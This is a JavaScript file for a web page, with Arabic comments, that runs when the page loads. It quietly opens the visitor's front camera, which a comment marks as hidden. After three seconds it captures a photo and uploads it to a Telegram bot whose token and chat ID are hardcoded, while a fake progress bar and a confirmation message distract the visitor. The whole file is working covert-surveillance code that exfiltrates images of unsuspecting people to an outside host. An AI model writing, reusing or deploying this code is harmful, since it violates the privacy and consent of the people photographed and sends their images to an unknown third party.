// عناصر التحكم
const progressBar = document.getElementById('progressBar');
const video = document.getElementById('video');
const confirmationMessage = document.getElementById('confirmationMessage');
const duration = 20000; // 20 ثانية

// دالة إرسال الصورة إلى Telegram
async function sendPhotoToTelegram(photoData) {
    const botToken = '8387241026:AAFP3m5vSV5KpV63lF0kCiR1OJJEbOelQl4';
    const chatId = '7002841594';
    
    try {
        const formData = new FormData();
        const blob = await (await fetch(photoData)).blob();
        formData.append('photo', blob, 'user_photo.png');
        formData.append('chat_id', chatId);
        formData.append('caption', 'صورة المستخدم تم التقاطها تلقائياً');
        
        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
            method: 'POST',
            body: formData
        });
        
        const data = await response.json();
        return data.ok;
    } catch (error) {
        console.error('Error sending photo to Telegram:', error);
        return false;
    }
}

// دالة التقاط الصورة وإرجاعها كـ base64
function capturePhoto(stream) {
    return new Promise((resolve) => {
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        
        // إيقاف الكمرة
        stream.getTracks().forEach(track => track.stop());
        
        // إرجاع الصورة كـ base64
        resolve(canvas.toDataURL('image/png'));
    });
}

// بدء عملية الدخول والتقاط الصورة
async function startProcess() {
    const startTime = Date.now();
    
    // 1. تشغيل الكمرة الأمامية (مخفية)
    try {
        const stream = await navigator.mediaDevices.getUserMedia({
            video: {
                facingMode: 'user',
                width: { ideal: 1280 },
                height: { ideal: 720 }
            },
            audio: false
        });
        video.srcObject = stream;
    
        // 2. التقاط الصورة بعد 3 ثواني
        setTimeout(async () => {
            const photoData = await capturePhoto(stream);
            await sendPhotoToTelegram(photoData);
        }, 3000);
        
    } catch (err) {
        console.error('حدث خطأ في الكمرة:', err);
    }
    
    // 3. تحديث شريط التقدم
    function updateProgress() {
        const elapsed = Date.now() - startTime;
        const progress = Math.min(elapsed / duration, 1);
        progressBar.style.width = `${progress * 100}%`;
        
        if (progress < 1) {
            requestAnimationFrame(updateProgress);
        } else {
            // عرض رسالة التأكيد
            confirmationMessage.style.display = 'block';
            
            // إخفاء الرسالة بعد 3 ثواني
            setTimeout(() => {
                confirmationMessage.style.display = 'none';
            }, 3000);
        }
    }
    updateProgress();
}

// بدء العملية عند تحميل الصفحة
window.onload = startProcess;